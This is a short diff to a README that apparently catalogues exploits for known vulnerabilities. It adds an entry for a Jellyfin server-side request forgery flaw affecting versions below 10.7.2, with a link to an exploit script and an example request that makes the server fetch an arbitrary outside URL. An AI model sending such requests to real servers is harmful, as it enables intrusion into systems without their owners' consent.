@@ -102,6 +102,14 @@ Ref: https://github.com/ohnonoyesyes/CVE-2021-41653
 ![image](https://user-images.githubusercontent.com/92664048/144734569-957596a7-5c46-48ef-8eea-9b07b151b315.png)
 
 
+**[Jellyfin RemoteImageController.cs SSRF](https://github.com/0x0021h/expbox/blob/main/jellyfin.py)**
+```
+Jellyfin < 10.7.2
+
+Example:
+http://127.0.0.1:8096/Images/Remote?imageUrl=http://www.google.com
+```
+
 ### Note
 
 All content comes from the Internet, if there is a copyright problem, please contact me to delete.
